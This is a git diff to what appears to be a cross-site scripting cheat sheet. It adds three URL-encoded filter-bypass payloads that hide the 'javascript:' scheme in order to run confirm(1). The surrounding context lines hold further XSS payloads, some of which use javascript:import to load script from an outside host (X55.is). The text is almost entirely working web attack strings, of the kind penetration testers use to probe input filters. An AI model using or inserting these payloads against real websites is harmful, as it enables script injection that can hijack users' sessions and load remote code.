@@ -258,6 +258,9 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   %27%3E%0A%3C!--%3E%3Ca%20href=%22javascript:import(%27%2f%2fX55.is%27)%22%3ECLICK%3C/a%3E%0A%3C!--%3E
   %22bestxss=%3E%3Cxss%20contenteditable%20onbeforeinput=%22a='import(%60/%09/x55.is//%60)';b='javascript:';location=b%2Ba%22%3ESEARCHHERE%3C!--.html
   <details open onToGgle=abc=(co\u006efirm);abc(VulneravelXSS&#00000000000000000041//
+  %22%3E%3Ca%20href=%22javascript%26%2358%3Bconfirm(1)%22%3E
+  %22%3E%3Ca%20href=%22javascript%26colon;confirm(1)%22%3E
+  javascript:%26%23x3A%3Bconfirm(1)
   ```
 </details>
 
